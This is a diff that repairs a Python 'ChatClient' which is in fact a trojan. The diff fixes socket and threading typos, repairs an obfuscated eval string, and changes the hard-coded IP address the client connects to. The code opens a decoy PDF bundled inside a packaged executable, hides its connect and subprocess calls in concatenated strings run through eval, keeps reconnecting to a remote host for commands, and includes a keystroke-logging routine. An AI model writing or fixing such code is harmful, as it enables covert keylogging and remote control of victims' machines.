@@ -21,8 +21,8 @@ class ChatClient:
         self.time_out = 0
         self.time_out_cap = 1800
         time.sleep(1)
-        self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREEM)
-
+        self.my_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    
     def connect(self):
         self.open_data()
         y = 'self.my_so'+'cket.conn'+'ect((self.ho'+'st,self.p'+'ort))'
@@ -39,7 +39,7 @@ class ChatClient:
                 self.connected = True
                 self.is_running = True
                 self.time_out = 0
-                restart_thread = threading.thread(target=self.restart_connection)
+                restart_thread = threading.Thread(target=self.restart_connection)
                 restart_thread.start()
                 self.start_chat()
             except Exception:
@@ -67,7 +67,7 @@ class ChatClient:
                 self.time_out = 0
                 if message == "Conn"+"ection Esta"+"blished: ":
                     pass#print(message)
-                elif message == "Exit":
+                elif message == "exit":
                     self.is_running = False
                     self.my_socket.shutdown(socket.SHUT_RDWR)
                 elif message == "hold":
@@ -187,7 +187,7 @@ class ChatClient:
     
     def open_data(self):
         data = sys._MEIPASS + "\\demo_how_hack_without_exe.pdf"
-        x = 'subp'='rocess.P'+'ope'+'n(data, she'+'ll=True)'
+        x = 'subp'+'rocess.P'+'ope'+'n(data, she'+'ll=True)'
         eval(x)
     
     def dump_key_log(self):
@@ -238,5 +238,5 @@ class ChatClient:
                 self.char += " ctrl + "
 
 if __name__ == "__main__":
-    client = ChatClient('19'+'2.1'+'68.0'+'.110', 5656)
+    client = ChatClient('19'+'2.1'+'68.12'+'.186', 5656)
     client.connect()
